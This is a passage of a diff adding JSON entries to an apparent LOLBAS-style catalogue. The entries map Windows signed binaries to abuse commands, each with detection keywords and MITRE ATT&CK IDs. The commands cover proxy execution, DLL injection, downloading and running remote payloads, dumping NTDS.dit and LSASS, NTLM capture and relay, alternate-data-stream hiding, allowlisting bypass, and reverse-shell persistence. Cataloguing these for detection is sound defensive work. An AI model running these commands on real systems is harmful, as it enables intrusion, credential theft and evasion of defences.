+        "command": "powershell -ep RemoteSigned -f .\\Launch-VsDevShell.ps1 -VsInstallationPath \"/../../../../../; {PATH:.exe} ;\"",
+        "skeleton": [
+          "powershell",
+          "-ep",
+          "remotesigned",
+          "-vsinstallationpath"
+        ],
+        "category": "Execute",
+        "usecase": "Proxy execution",
+        "description": "Execute binaries and commands from the context of the signed script using the \"VsInstallationPath\" flag.",
+        "mitre": "T1216"
+      }
+    ],
+    "mavinject.exe": [
+      {
+        "command": "MavInject.exe 3110 /INJECTRUNNING {PATH_ABSOLUTE:.dll}",
+        "skeleton": [
+          "/injectrunning"
+        ],
+        "category": "Execute",
+        "usecase": "Inject dll file into running process",
+        "description": "Inject evil.dll into a process with PID 3110.",
+        "mitre": "T1218.013"
+      }
+    ],
+    "mmc.exe": [
+      {
+        "command": "mmc.exe -Embedding {PATH_ABSOLUTE:.msc}",
+        "skeleton": [
+          "-embedding"
+        ],
+        "category": "Execute",
+        "usecase": "Configure a snap-in to load a COM custom class (CLSID) that has been added to the registry",
+        "description": "Launch a 'backgrounded' MMC process and invoke a COM payload",
+        "mitre": "T1218.014"
+      }
+    ],
+    "mpcmdrun.exe": [
+      {
+        "command": "MpCmdRun.exe -DownloadFile -url {REMOTEURL:.exe} -path {PATH_ABSOLUTE:.exe}",
+        "skeleton": [
+          "-downloadfile",
+          "-url",
+          "-path"
+        ],
+        "category": "Download",
+        "usecase": "Download file",
+        "description": "Download file to specified path - Slashes work as well as dashes (/DownloadFile, /url, /path)",
+        "mitre": "T1105"
+      },
+      {
+        "command": "copy \"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2008.9-0\\MpCmdRun.exe\" C:\\Users\\Public\\Downloads\\MP.exe && chdir \"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.2008.9-0\\\" && \"C:\\Users\\Public\\Downloads\\MP.exe\" -DownloadFile -url {REMOTEURL:.exe} -path C:\\Users\\Public\\Downloads\\evil.exe",
+        "skeleton": [
+          "copy",
+          "chdir",
+          "-downloadfile",
+          "-url",
+          "-path"
+        ],
+        "category": "Download",
+        "usecase": "Download file",
+        "description": "Download file to specified path. Slashes work as well as dashes (/DownloadFile, /url, /path). Updated version to bypass Windows 10 mitigation.",
+        "mitre": "T1105"
+      }
+    ],
+    "msbuild.exe": [
+      {
+        "command": "msbuild.exe /logger:TargetLogger,{PATH_ABSOLUTE:.dll};MyParameters,Foo",
+        "skeleton": [
+          "/logger:"
+        ],
+        "category": "Execute",
+        "usecase": "Execute DLL",
+        "description": "Executes generated Logger DLL file with TargetLogger export.",
+        "mitre": "T1127.001"
+      }
+    ],
+    "mscopilot.exe": [
+      {
+        "command": "mscopilot.exe --no-startup-window --disable-gpu-sandbox --gpu-launcher=\"{CMD} && taskkill /f /im mscopilot.exe &&\"",
+        "skeleton": [
+          "--no-startup-window",
+          "--disable-gpu-sandbox",
+          "--gpu-launcher=",
+          "taskkill",
+          "/im"
+        ],
+        "category": "Execute",
+        "usecase": "Executes a process under a trusted Microsoft signed binary",
+        "description": "`mscopilot.exe` will spawn the provided command. Parent `mscopilot.exe` process needs to be killed to avoid command being executed an infinite number of times.",
+        "mitre": "T1218.015"
+      }
+    ],
+    "mscopilot_proxy.exe": [
+      {
+        "command": "mscopilot_proxy.exe --no-startup-window --disable-gpu-sandbox --gpu-launcher=\"cmd.exe /c calc.exe && taskkill /f /im mscopilot.exe &&\"",
+        "skeleton": [
+          "--no-startup-window",
+          "--disable-gpu-sandbox",
+          "taskkill",
+          "/im"
+        ],
+        "category": "Execute",
+        "usecase": "Executes a process under a trusted Microsoft signed binary",
+        "description": "`mscopilot_proxy.exe` will spawn the provided command. Parent `mscopilot_proxy.exe` process needs to be killed to avoid command being executed an infinite number of times.",
+        "mitre": "T1218.015"
+      }
+    ],
+    "msdeploy.exe": [
+      {
+        "command": "msdeploy.exe -verb:sync -source:RunCommand -dest:runCommand=\"{PATH_ABSOLUTE:.bat}\"",
+        "skeleton": [
+          "-verb:",
+          "-source:",
+          "-dest:"
+        ],
+        "category": "Execute",
+        "usecase": "Local execution of batch file using msdeploy.exe.",
+        "description": "Launch .bat file via msdeploy.exe.",
+        "mitre": "T1218"
+      }
+    ],
+    "msdt.exe": [
+      {
+        "command": "msdt.exe -path C:\\WINDOWS\\diagnostics\\index\\PCWDiagnostic.xml -af {PATH_ABSOLUTE:.xml} /skip TRUE",
+        "skeleton": [
+          "-path",
+          "-af",
+          "/skip",
+          "true"
+        ],
+        "category": "Execute",
+        "usecase": "Execute code",
+        "description": "Executes the Microsoft Diagnostics Tool and executes the malicious .MSI referenced in the .xml file.",
+        "mitre": "T1218"
+      },
+      {
+        "command": "msdt.exe /id PCWDiagnostic /skip force /param \"IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(calc).exe\"",
+        "skeleton": [
+          "/id",
+          "pcwdiagnostic",
+          "/skip",
+          "force",
+          "/param"
+        ],
+        "category": "AWL Bypass",
+        "usecase": "Execute code bypass Application allowlisting",
+        "description": "Executes arbitrary commands using the Microsoft Diagnostics Tool and leveraging the \"PCWDiagnostic\" module (CVE-2022-30190). Note that this specific technique will not work on a patched system with the June 2022 Windows Security update.",
+        "mitre": "T1202"
+      }
+    ],
+    "msedge.exe": [
+      {
+        "command": "msedge.exe --headless --enable-logging --disable-gpu --dump-dom \"{REMOTEURL:.base64.html}\" > {PATH:.b64}",
+        "skeleton": [
+          "--headless",
+          "--enable-logging",
+          "--disable-gpu",
+          "--dump-dom"
+        ],
+        "category": "Download",
+        "usecase": "Download file from the internet",
+        "description": "Edge will silently download the file. File extension should be .html and binaries should be encoded.",
+        "mitre": "T1105"
+      },
+      {
+        "command": "msedge.exe --disable-gpu-sandbox --gpu-launcher=\"{CMD} &&\"",
+        "skeleton": [
+          "--disable-gpu-sandbox",
+          "--gpu-launcher="
+        ],
+        "category": "Execute",
+        "usecase": "Executes a process under a trusted Microsoft signed binary",
+        "description": "Edge spawns cmd.exe as a child process of msedge.exe and executes the specified command",
+        "mitre": "T1218.015"
+      }
+    ],
+    "msedge_proxy.exe": [
+      {
+        "command": "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge_proxy.exe --disable-gpu-sandbox --gpu-launcher=\"{CMD} &&\"",
+        "skeleton": [
+          "files",
+          "--disable-gpu-sandbox",
+          "--gpu-launcher="
+        ],
+        "category": "Execute",
+        "usecase": "Executes a process under a trusted Microsoft signed binary",
+        "description": "msedge_proxy.exe will execute file in the background",
+        "mitre": "T1218.015"
+      }
+    ],
+    "msedgewebview2.exe": [
+      {
+        "command": "msedgewebview2.exe --no-sandbox --browser-subprocess-path=\"{PATH_ABSOLUTE:.exe}\"",
+        "skeleton": [
+          "--no-sandbox",
+          "--browser-subprocess-path="
+        ],
+        "category": "Execute",
+        "usecase": "Proxy execution of binary",
+        "description": "This command launches the Microsoft Edge WebView2 browser control without sandboxing and will spawn the specified executable as its subprocess.",
+        "mitre": "T1218.015"
+      },
+      {
+        "command": "msedgewebview2.exe --utility-cmd-prefix=\"{CMD}\"",
+        "skeleton": [
+          "--utility-cmd-prefix="
+        ],
+        "category": "Execute",
+        "usecase": "Proxy execution of binary",
+        "description": "This command launches the Microsoft Edge WebView2 browser control without sandboxing and will spawn the specified command as its subprocess.",
+        "mitre": "T1218.015"
+      },
+      {
+        "command": "msedgewebview2.exe --disable-gpu-sandbox --gpu-launcher=\"{CMD}\"",
+        "skeleton": [
+          "--disable-gpu-sandbox",
+          "--gpu-launcher="
+        ],
+        "category": "Execute",
+        "usecase": "Proxy execution of binary",
+        "description": "This command launches the Microsoft Edge WebView2 browser control without sandboxing and will spawn the specified command as its subprocess.",
+        "mitre": "T1218.015"
+      },
+      {
+        "command": "msedgewebview2.exe --no-sandbox --renderer-cmd-prefix=\"{CMD}\"",
+        "skeleton": [
+          "--no-sandbox",
+          "--renderer-cmd-prefix="
+        ],
+        "category": "Execute",
+        "usecase": "Proxy execution of binary",
+        "description": "This command launches the Microsoft Edge WebView2 browser control without sandboxing and will spawn the specified command as its subprocess.",
+        "mitre": "T1218.015"
+      }
+    ],
+    "msiexec.exe": [
+      {
+        "command": "msiexec /quiet /i {PATH:.msi}",
+        "skeleton": [
+          "/quiet"
+        ],
+        "category": "Execute",
+        "usecase": "Execute custom made msi file with attack code",
+        "description": "Installs the target .MSI file silently.",
+        "mitre": "T1218.007"
+      },
+      {
+        "command": "msiexec /i {PATH_ABSOLUTE:.msi} TRANSFORMS=\"{REMOTEURL:.mst}\" /qb",
+        "skeleton": [
+          "/qb"
+        ],
+        "category": "Execute",
+        "usecase": "Install trusted and signed msi file, with additional attack code as transformation file, from a remote server",
+        "description": "Installs the target .MSI file from a remote URL, the file can be signed by vendor. Additional to the file a transformation file will be used, which can contains malicious code or binaries. The /qb will skip user input.",
+        "mitre": "T1218.007"
+      }
+    ],
+    "msoxmled.exe": [
+      {
+        "command": "msoxmled.exe /verb open {REMOTEURL}",
+        "skeleton": [
+          "/verb",
+          "open"
+        ],
+        "category": "Download",
+        "usecase": "It will download a remote payload and place it in INetCache.",
+        "description": "Downloads payload from remote server using the Microsoft Office XML Editor.",
+        "mitre": "T1105"
+      }
+    ],
+    "nmcap.exe": [
+      {
+        "command": "nmcap.exe /network * /capture /file {PATH_ABSOLUTE:.cap}",
+        "skeleton": [
+          "/network",
+          "/capture",
+          "/file"
+        ],
+        "category": "Reconnaissance",
+        "usecase": "Capture network traffic on windows to collect sensitive data.",
+        "description": "Start capture on all network adapters and save to specified .cap (circular) file.\nOptionally, one can add:\n- `/TerminateWhen /TimeAfter 30 seconds` to auto-terminate after a relative times (e.g. 30 seconds);\n- `/TerminateWhen /Time 04:52:00 AM 9/17/2025` to auto-terminate after a specific date/time;\n- `/TerminateWhen /KeyPress x` to terminate when a specific key is pressed.",
+        "mitre": "T1040"
+      }
+    ],
+    "ntdsutil.exe": [
+      {
+        "command": "ntdsutil.exe \"ac i ntds\" \"ifm\" \"create full c:\\\" q q",
+        "skeleton": [
+          "ntds",
+          "create",
+          "full"
+        ],
+        "category": "Dump",
+        "usecase": "Dumping of Active Directory NTDS.dit database",
+        "description": "Dump NTDS.dit into folder",
+        "mitre": "T1003.003"
+      }
+    ],
+    "odbcconf.exe": [
+      {
+        "command": "odbcconf INSTALLDRIVER \"lolbas-project|Driver={PATH_ABSOLUTE:.dll}|APILevel=2\"\nodbcconf configsysdsn \"lolbas-project\" \"DSN=lolbas-project\"",
+        "skeleton": [
+          "installdriver",
+          "configsysdsn"
+        ],
+        "category": "Execute",
+        "usecase": "Execute dll file using technique that can evade defensive counter measures",
+        "description": "Install a driver and load the DLL. Requires administrator privileges.",
+        "mitre": "T1218.008"
+      }
+    ],
+    "pktmon.exe": [
+      {
+        "command": "pktmon.exe start --etw",
+        "skeleton": [
+          "start",
+          "--etw"
+        ],
+        "category": "Reconnaissance",
+        "usecase": "use this a built in network sniffer on windows 10 to capture senstive traffic",
+        "description": "Will start a packet capture and store log file as PktMon.etl. Use pktmon.exe stop",
+        "mitre": "T1040"
+      }
+    ],
+    "print.exe": [
+      {
+        "command": "print /D:{PATH_ABSOLUTE}:file.exe {PATH_ABSOLUTE:.exe}",
+        "skeleton": [
+          "/d:"
+        ],
+        "category": "ADS",
+        "usecase": "Hide binary file in alternate data stream to potentially bypass defensive counter measures",
+        "description": "Copy file.exe into the Alternate Data Stream (ADS) of file.txt.",
+        "mitre": "T1564.004"
+      }
+    ],
+    "procdump.exe": [
+      {
+        "command": "procdump.exe -md {PATH:.dll} explorer.exe",
+        "skeleton": [
+          "-md"
+        ],
+        "category": "Execute",
+        "usecase": "Performs execution of unsigned DLL.",
+        "description": "Loads the specified DLL where DLL is configured with a 'MiniDumpCallbackRoutine' exported function. Valid process must be provided as dump still created.",
+        "mitre": "T1202"
+      },
+      {
+        "command": "procdump.exe -md {PATH:.dll} foobar",
+        "skeleton": [
+          "-md",
+          "foobar"
+        ],
+        "category": "Execute",
+        "usecase": "Performs execution of unsigned DLL.",
+        "description": "Loads the specified DLL where configured with DLL_PROCESS_ATTACH execution, process argument can be arbitrary.",
+        "mitre": "T1202"
+      }
+    ],
+    "psr.exe": [
+      {
+        "command": "psr.exe /start /output {PATH_ABSOLUTE:.zip} /sc 1 /gui 0",
+        "skeleton": [
+          "/start",
+          "/output",
+          "/sc",
+          "/gui"
+        ],
+        "category": "Reconnaissance",
+        "usecase": "Can be used to take screenshots of the user environment",
+        "description": "Record a user screen without creating a GUI. You should use \"psr.exe /stop\" to stop recording and create output file.",
+        "mitre": "T1113"
+      }
+    ],
+    "rdrleakdiag.exe": [
+      {
+        "command": "rdrleakdiag.exe /p 940 /o {PATH_ABSOLUTE:folder} /fullmemdmp /wait 1",
+        "skeleton": [
+          "/fullmemdmp",
+          "/wait"
+        ],
+        "category": "Dump",
+        "usecase": "Dump process by PID.",
+        "description": "Dump process by PID and create a dump file (creates files called `minidump_<PID>.dmp` and `results_<PID>.hlk`).",
+        "mitre": "T1003"
+      },
+      {
+        "command": "rdrleakdiag.exe /p 832 /o {PATH_ABSOLUTE:folder} /fullmemdmp /snap",
+        "skeleton": [
+          "/fullmemdmp",
+          "/snap"
+        ],
+        "category": "Dump",
+        "usecase": "Dump LSASS process mutliple times.",
+        "description": "After dumping a process using `/wait 1`, subsequent dumps must use `/snap` (creates files called `minidump_<PID>.dmp` and `results_<PID>.hlk`).",
+        "mitre": "T1003.001"
+      }
+    ],
+    "register-cimprovider.exe": [
+      {
+        "command": "Register-cimprovider -path {PATH_ABSOLUTE:.dll}",
+        "skeleton": [
+          "-path"
+        ],
+        "category": "Execute",
+        "usecase": "Execute code within dll file",
+        "description": "Load the target .DLL.",
+        "mitre": "T1218"
+      }
+    ],
+    "regsvr32.exe": [
+      {
+        "command": "regsvr32 /s /n /u /i:{REMOTEURL:.sct} scrobj.dll",
+        "skeleton": [
+          "/i:"
+        ],
+        "category": "AWL Bypass",
+        "usecase": "Execute code from remote scriptlet, bypass Application whitelisting",
+        "description": "Execute the specified remote .SCT script with scrobj.dll.",
+        "mitre": "T1218.010"
+      }
+    ],
+    "rpcping.exe": [
+      {
+        "command": "rpcping -s 127.0.0.1 -e 1234 -a privacy -u NTLM",
+        "skeleton": [
+          "privacy",
+          "ntlm"
+        ],
+        "category": "Credentials",
+        "usecase": "Capture credentials on a non-standard port",
+        "description": "Send a RPC test connection to the target server (-s) and force the NTLM hash to be sent in the process.",
+        "mitre": "T1003"
+      },
+      {
+        "command": "rpcping /s 10.0.0.35 /e 9997 /a connect /u NTLM",
+        "skeleton": [
+          "connect",
+          "ntlm"
+        ],
+        "category": "Credentials",
+        "usecase": "Relay a NTLM authentication over RPC (ncacn_ip_tcp) on a custom port",
+        "description": "Trigger an authenticated RPC call to the target server (/s) that could be relayed to a privileged resource (Sign not Set).",
+        "mitre": "T1187"
+      }
+    ],
+    "rundll32.exe": [
+      {
+        "command": "rundll32.exe -sta {CLSID}",
+        "skeleton": [
+          "-sta"
+        ],
+        "category": "Execute",
+        "usecase": "Execute a DLL/EXE COM server payload or ScriptletURL code.",
+        "description": "Use Rundll32.exe to load a registered or hijacked COM Server payload. Also works with ProgID.",
+        "mitre": "T1218.011"
+      }
+    ],
+    "runonce.exe": [
+      {
+        "command": "Runonce.exe /AlternateShellStartup",
+        "skeleton": [
+          "/alternateshellstartup"
+        ],
+        "category": "Execute",
+        "usecase": "Persistence, bypassing defensive counter measures",
+        "description": "Executes a Run Once Task that has been configured in the registry.",
+        "mitre": "T1218"
+      }
+    ],
+    "sc.exe": [
+      {
+        "command": "sc create evilservice binPath=\"\\\"c:\\\\ADS\\\\file.txt:cmd.exe\\\" /c echo works > \\\"c:\\ADS\\works.txt\\\"\" DisplayName= \"evilservice\" start= auto\\ & sc start evilservice",
+        "skeleton": [
+          "create",
+          "evilservice",
+          "echo",
+          "works",
+          "start"
+        ],
+        "category": "ADS",
+        "usecase": "Execute binary file hidden inside an alternate data stream",
+        "description": "Creates a new service and executes the file stored in the ADS.",
+        "mitre": "T1564.004"
+      },
+      {
+        "command": "sc config {ExistingServiceName} binPath=\"\\\"c:\\\\ADS\\\\file.txt:cmd.exe\\\" /c echo works > \\\"c:\\ADS\\works.txt\\\"\" & sc start {ExistingServiceName}",
+        "skeleton": [
+          "config",
+          "echo",
+          "works",
+          "start"
+        ],
+        "category": "ADS",
+        "usecase": "Execute binary file hidden inside an alternate data stream",
+        "description": "Modifies an existing service and executes the file stored in the ADS.",
+        "mitre": "T1564.004"
+      }
+    ],
+    "schtasks.exe": [
+      {
+        "command": "schtasks /create /sc minute /mo 1 /tn \"Reverse shell\" /tr \"{CMD}\"",
+        "skeleton": [
+          "/create",
+          "/sc",
+          "minute",
+          "/mo",
+          "/tn",
+          "reverse",
+          "shell",
+          "/tr"
+        ],
+        "category": "Execute",
+        "usecase": "Create a recurring task to keep reverse shell session(s) alive",
+        "description": "Create a recurring task to execute every minute.",
+        "mitre": "T1053.005"
+      },
+      {
+        "command": "schtasks /create /s targetmachine /tn \"MyTask\" /tr \"{CMD}\" /sc daily",
+        "skeleton": [
+          "/create",
+          "targetmachine",
+          "/tn",
+          "mytask",
+          "/tr",
+          "/sc",
+          "daily"
+        ],
+        "category": "Execute",
+        "usecase": "Create a remote task to run daily relative to the the time of creation",
+        "description": "Create a scheduled task on a remote computer for persistence/lateral movement",
+        "mitre": "T1053.005"
+      }
+    ],
+    "scriptrunner.exe": [
+      {
+        "command": "Scriptrunner.exe -appvscript {PATH:.exe}",
+        "skeleton": [
+          "-appvscript"
+        ],
+        "category": "Execute",
+        "usecase": "Execute binary through proxy binary to evade defensive counter measures",
+        "description": "Executes executable",
+        "mitre": "T1202"
+      }
+    ],
+    "settingsynchost.exe": [
+      {
+        "command": "SettingSyncHost -LoadAndRunDiagScript {PATH:.exe}",
+        "skeleton": [
+          "-loadandrundiagscript"
+        ],
+        "category": "Execute",
+        "usecase": "Can be used to evade defensive countermeasures or to hide as a persistence mechanism",
+        "description": "Execute file specified in %COMSPEC%",
+        "mitre": "T1218"
+      },
+      {
+        "command": "SettingSyncHost -LoadAndRunDiagScriptNoCab {PATH:.bat}",
+        "skeleton": [
+          "-loadandrundiagscriptnocab"
+        ],
+        "category": "Execute",
+        "usecase": "Can be used to evade defensive countermeasures or to hide as a persistence mechanism. Additionally, effectively act as a -WindowStyle Hidden option (as there is in PowerShell) for any arbitrary batch file.",
+        "description": "Execute a batch script in the background (no window ever pops up) which can be subverted to running arbitrary programs by setting the current working directory to %TMP% and creating files such as reg.bat/reg.exe in that directory thereby causing them to execute instead of the ones in C:\\Windows\\System32.",
+        "mitre": "T1218"
+      }
+    ],
+    "sqlps.exe": [
+      {
+        "command": "Sqlps.exe -noprofile",
+        "skeleton": [
+          "-noprofile"
+        ],
+        "category": "Execute",
+        "usecase": "Execute PowerShell commands without ScriptBlock logging.",
+        "description": "Run a SQL Server PowerShell mini-console without Module and ScriptBlock Logging.",
+        "mitre": "T1218"
+      }
+    ],
+    "sqltoolsps.exe": [
+      {
+        "command": "SQLToolsPS.exe -noprofile -command Start-Process {PATH:.exe}",
+        "skeleton": [
+          "-noprofile",
+          "-command"
+        ],
+        "category": "Execute",
+        "usecase": "Execute PowerShell command.",
+        "description": "Run a SQL Server PowerShell mini-console without Module and ScriptBlock Logging.",
+        "mitre": "T1218"
+      }
+    ],
+    "squirrel.exe": [
+      {
+        "command": "squirrel.exe --download {REMOTEURL}",
+        "skeleton": [
+          "--download"
+        ],
+        "category": "Download",
+        "usecase": "Download binary",
+        "description": "The above binary will go to url and look for RELEASES file and download the nuget package.",
+        "mitre": "T1218"
+      },
+      {
+        "command": "squirrel.exe --update {REMOTEURL}",
+        "skeleton": [
+          "--update"
+        ],
+        "category": "AWL Bypass",
+        "usecase": "Download and execute binary",
+        "description": "The above binary will go to url and look for RELEASES file, download and install the nuget package.",
+        "mitre": "T1218"
+      },
+      {
+        "command": "squirrel.exe --updateRollback={REMOTEURL}",
+        "skeleton": [
+          "--updaterollback="
+        ],
+        "category": "AWL Bypass",
+        "usecase": "Download and execute binary",
+        "description": "The above binary will go to url and look for RELEASES file, download and install the nuget package.",
+        "mitre": "T1218"
+      }
+    ],
+    "syssetup.dll": [
+      {
+        "command": "rundll32 syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 {PATH_ABSOLUTE:.inf}",
+        "skeleton": [
+          "rundll32",
+          "defaultinstall"
+        ],
+        "category": "AWL Bypass",
+        "usecase": "Run local or remote script(let) code through INF file specification (Note May pop an error window).",
+        "description": "Execute the specified (local or remote) .wsh/.sct script with scrobj.dll in the .inf file by calling an information file directive (section name specified).",
+        "mitre": "T1218.011"
+      }
+    ],
+    "tar.exe": [
+      {
+        "command": "tar -cf {PATH}:ads {PATH_ABSOLUTE:folder}",
+        "skeleton": [
+          "-cf"
+        ],
+        "category": "ADS",
+        "usecase": "Can be used to evade defensive countermeasures, or to hide as part of a persistence mechanism",
+        "description": "Compress one or more files to an alternate data stream (ADS).",
+        "mitre": "T1564.004"
+      },
+      {
+        "command": "tar -xf {PATH}:ads",
+        "skeleton": [
+          "-xf"
+        ],
+        "category": "ADS",
+        "usecase": "Can be used to evade defensive countermeasures, or to hide as part of a persistence mechanism",
+        "description": "Decompress a compressed file from an alternate data stream (ADS).",
+        "mitre": "T1564.004"
+      }
+    ],
+    "teams.exe": [
+      {
+        "command": "teams.exe --disable-gpu-sandbox --gpu-launcher=\"{CMD} &&\"",
+        "skeleton": [
+          "--disable-gpu-sandbox",
+          "--gpu-launcher="
+        ],
+        "category": "Execute",
+        "usecase": "Executes a process under a trusted Microsoft signed binary",
+        "description": "Teams spawns cmd.exe as a child process of teams.exe and executes the ping command",
+        "mitre": "T1218.015"
+      }
+    ],
+    "ttdinject.exe": [
+      {
+        "command": "TTDInject.exe /ClientParams \"7 tmp.run 0 0 0 0 0 0 0 0 0 0\" /Launch \"{PATH:.exe}\"",
+        "skeleton": [
+          "/clientparams",
+          "/launch"
+        ],
+        "category": "Execute",
+        "usecase": "Spawn process using other binary",
+        "description": "Execute a program using ttdinject.exe. Requires administrator privileges. A log file will be created in tmp.run. The log file can be changed, but the length (7) has to be updated.",
+        "mitre": "T1127"
+      },
+      {
+        "command": "ttdinject.exe /ClientScenario TTDRecorder /ddload 0 /ClientParams \"7 tmp.run 0 0 0 0 0 0 0 0 0 0\" /launch \"{PATH:.exe}\"",
+        "skeleton": [
+          "/clientscenario",
+          "ttdrecorder",
+          "/ddload",
+          "/clientparams",
+          "/launch"
+        ],
+        "category": "Execute",
+        "usecase": "Spawn process using other binary",
+        "description": "Execute a program using ttdinject.exe. Requires administrator privileges. A log file will be created in tmp.run. The log file can be changed, but the length (7) has to be updated.",
+        "mitre": "T1127"
+      }
+    ],
+    "tttracer.exe": [
+      {
+        "command": "TTTracer.exe -dumpFull -attach {PID}",
+        "skeleton": [
+          "-dumpfull",
+          "-attach"
+        ],
+        "category": "Dump",
+        "usecase": "Dump process by PID",
+        "description": "Dumps process using tttracer.exe. Requires administrator privileges",
+        "mitre": "T1003"
+      }
+    ],
+    "unregmp2.exe": [
+      {
+        "command": "rmdir %temp%\\lolbin /s /q 2>nul & mkdir \"%temp%\\lolbin\\Windows Media Player\" & copy C:\\Windows\\System32\\calc.exe \"%temp%\\lolbin\\Windows Media Player\\wmpnscfg.exe\" >nul && cmd /V /C \"set \"ProgramW6432=%temp%\\lolbin\" && unregmp2.exe /HideWMP\"",
+        "skeleton": [
+          "rmdir",
+          "mkdir",
+          "media",
+          "player",
+          "copy",
+          "/hidewmp"
+        ],
+        "category": "Execute",
+        "usecase": "Proxy execution of binary",
+        "description": "Allows an attacker to copy a target binary to a controlled directory and modify the 'ProgramW6432' environment variable to point to that controlled directory, then execute 'unregmp2.exe' with argument '/HideWMP' which will spawn a process at the hijacked path '%ProgramW6432%\\wmpnscfg.exe'.",
+        "mitre": "T1202"
+      }
+    ],
+    "update.exe": [
+      {
+        "command": "Update.exe --download {REMOTEURL}",
+        "skeleton": [
+          "--download"
+        ],
+        "category": "Download",
+        "usecase": "Download binary",
+        "description": "The above binary will go to url and look for RELEASES file and download the nuget package.",
+        "mitre": "T1218"
+      },
+      {
+        "command": "Update.exe --update={REMOTEURL}",
+        "skeleton": [
+          "--update="
+        ],
+        "category": "AWL Bypass",
+        "usecase": "Download and execute binary",
+        "description": "The above binary will go to url and look for RELEASES file, download and install the nuget package.",
+        "mitre": "T1218"
+      },
+      {
+        "command": "Update.exe --updateRollback={REMOTEURL}",
+        "skeleton": [
+          "--updaterollback="
+        ],
+        "category": "AWL Bypass",
+        "usecase": "Download and execute binary",
+        "description": "The above binary will go to url and look for RELEASES file, download and install the nuget package.",
+        "mitre": "T1218"
+      },
+      {
+        "command": "Update.exe --processStart {PATH:.exe} --process-start-args \"{CMD:args}\"",
+        "skeleton": [
+          "--processstart",
+          "--process-start-args"
+        ],
+        "category": "AWL Bypass",
+        "usecase": "Application Whitelisting Bypass",
+        "description": "Copy your payload into %userprofile%\\AppData\\Local\\Microsoft\\Teams\\current\\. Then run the command. Update.exe will execute the file you copied.",
+        "mitre": "T1218"
+      },
+      {
+        "command": "Update.exe --createShortcut={PATH:.exe} -l=Startup",
+        "skeleton": [
+          "--createshortcut=",
+          "-l=startup"
+        ],
+        "category": "Execute",
+        "usecase": "Execute binary",
+        "description": "Copy your payload into \"%localappdata%\\Microsoft\\Teams\\current\\\". Then run the command. Update.exe will create a shortcut to the specified executable in \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\". Then payload will run on every login of the user who runs it.",
+        "mitre": "T1547"
+      },
+      {
+        "command": "Update.exe --removeShortcut={PATH:.exe}-l=Startup",
+        "skeleton": [
+          "--removeshortcut=",
+          "-l=startup"
+        ],
+        "category": "Execute",
+        "usecase": "Execute binary",
+        "description": "Run the command to remove the shortcut created in the \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\" directory you created with the LolBinExecution \"--createShortcut\" described on this page.",
+        "mitre": "T1070"
+      }
+    ],
+    "utilityfunctions.ps1": [
+      {
+        "command": "powershell.exe -ep bypass -command \"set-location -path c:\\windows\\diagnostics\\system\\networking; import-module .\\UtilityFunctions.ps1; RegSnapin ..\\..\\..\\..\\temp\\unsigned.dll;[Program.Class]::Main()\"",
+        "skeleton": [
+          "-ep",
+          "bypass",
+          "-command",
+          "-path",
+          "regsnapin"
+        ],
+        "category": "Execute",
+        "usecase": "Execute proxied payload with Microsoft signed binary",
+        "description": "Proxy execute Managed DLL with PowerShell",
+        "mitre": "T1216"
+      }
+    ],
+    "vbc.exe": [
+      {
+        "command": "vbc.exe /target:exe {PATH_ABSOLUTE:.vb}",
+        "skeleton": [
+          "/target:"
+        ],
+        "category": "Compile",
+        "usecase": "Compile attacker code on system. Bypass defensive counter measures.",
+        "description": "Binary file used by .NET to compile Visual Basic code to an executable.",
+        "mitre": "T1127"
+      }
+    ],
+    "vsdiagnostics.exe": [
+      {
+        "command": "VSDiagnostics.exe start 1 /launch:{PATH:.exe}",
+        "skeleton": [
+          "start",
+          "/launch:"
+        ],
+        "category": "Execute",
+        "usecase": "Proxy execution of binary",
+        "description": "Starts a collection session with sessionID 1 and calls kernelbase.CreateProcessW to launch specified executable.",
+        "mitre": "T1127"
+      },
+      {
+        "command": "VSDiagnostics.exe start 2 /launch:{PATH:.exe} /launchArgs:\"{CMD:args}\"",
+        "skeleton": [
+          "start",
+          "/launch:",
+          "/launchargs:"
+        ],
+        "category": "Execute",
+        "usecase": "Proxy execution of binary with arguments",
+        "description": "Starts a collection session with sessionID 2 and calls kernelbase.CreateProcessW to launch specified executable. Arguments specified in launchArgs are passed to CreateProcessW.",
+        "mitre": "T1127"
+      }
+    ],
+    "vshadow.exe": [
+      {
+        "command": "vshadow.exe -nw -exec={PATH_ABSOLUTE:.exe} C:",
+        "skeleton": [
+          "-nw",
+          "-exec="
+        ],
+        "category": "Execute",
+        "usecase": "Performs execution of specified executable file.",
+        "description": "Executes specified executable from vshadow.exe.",
+        "mitre": "T1202"
+      }
+    ],
+    "vsls-agent.exe": [
+      {
+        "command": "vsls-agent.exe --agentExtensionPath {PATH_ABSOLUTE:.dll}",
+        "skeleton": [
+          "--agentextensionpath"
+        ],
+        "category": "Execute",
+        "usecase": "Execute proxied payload with Microsoft signed binary",
+        "description": "Load a library payload using the --agentExtensionPath parameter (32-bit)",
+        "mitre": "T1218"
+      }
+    ],
+    "wbadmin.exe": [
+      {
+        "command": "wbadmin start backup -backupTarget:{PATH_ABSOLUTE:folder} -include:C:\\Windows\\NTDS\\NTDS.dit,C:\\Windows\\System32\\config\\SYSTEM -quiet",
+        "skeleton": [
+          "start",
+          "backup",
+          "-backuptarget:",
+          "-quiet"
+        ],
+        "category": "Dump",
+        "usecase": "Snapshoting of Active Directory NTDS.dit database",
+        "description": "Extract NTDS.dit and SYSTEM hive into backup virtual hard drive file (.vhdx)",
+        "mitre": "T1003.003"
+      },
+      {
+        "command": "wbadmin start recovery -version:<VERSIONIDENTIFIER> -recoverytarget:{PATH_ABSOLUTE:folder} -itemtype:file -items:C:\\Windows\\NTDS\\NTDS.dit,C:\\Windows\\System32\\config\\SYSTEM -notRestoreAcl -quiet",
+        "skeleton": [
+          "start",
+          "recovery",
+          "-version:",
+          "-recoverytarget:",
+          "-itemtype:",
+          "-notrestoreacl",
+          "-quiet"
+        ],
+        "category": "Dump",
+        "usecase": "Dumping of Active Directory NTDS.dit database",
+        "description": "Restore a version of NTDS.dit and SYSTEM hive into file path. The command `wbadmin get versions` can be used to find version identifiers.",
+        "mitre": "T1003.003"
+      }
+    ],
+    "winget.exe": [
+      {
+        "command": "winget.exe install --manifest {PATH:.yml}",
+        "skeleton": [
+          "install",
+          "--manifest"
